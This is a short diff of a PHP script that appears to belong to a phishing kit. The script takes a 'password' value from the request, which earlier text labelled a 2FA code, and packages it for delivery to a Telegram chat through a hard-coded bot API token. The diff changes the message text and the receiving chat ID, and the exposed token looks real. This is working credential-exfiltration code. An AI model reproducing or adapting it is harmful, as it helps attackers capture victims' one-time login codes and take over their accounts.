@@ -4,11 +4,11 @@ include ("dump1.php");
 $code = $_GET['password'];
 
 
-$message ="2FA - $code\n";
+$message ="$code\n";
 
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
-    'chat_id' => '-1001831940786',
+    'chat_id' => '-941371012',
     'text' => $message
 ];
 
